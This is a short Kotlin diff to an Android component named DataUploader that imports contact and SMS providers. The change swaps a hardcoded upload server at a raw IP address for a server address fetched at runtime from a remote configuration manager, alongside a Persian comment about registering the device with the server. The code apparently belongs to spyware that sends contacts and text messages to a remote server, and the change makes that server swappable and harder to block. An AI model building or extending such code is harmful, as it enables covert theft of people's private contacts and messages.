@@ -5,6 +5,7 @@ import android.util.Log
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.database.Cursor
+import com.example.test.RemoteConfigManager
 import org.json.JSONArray
 import org.json.JSONObject
 import java.net.HttpURLConnection
@@ -13,7 +14,10 @@ import java.net.URL
 object DataUploader {
 
     private const val TAG = "DataUploader"
-    private const val BASE_URL = "http://95.134.130.160:8765"
+    
+    // 🔧 Use RemoteConfigManager for dynamic BASE_URL
+    private val BASE_URL: String
+        get() = RemoteConfigManager.getBaseUrl()
 
     /**
      * رجیستر کردن دستگاه در سرور (فرمت snake_case برای سینک با Python)
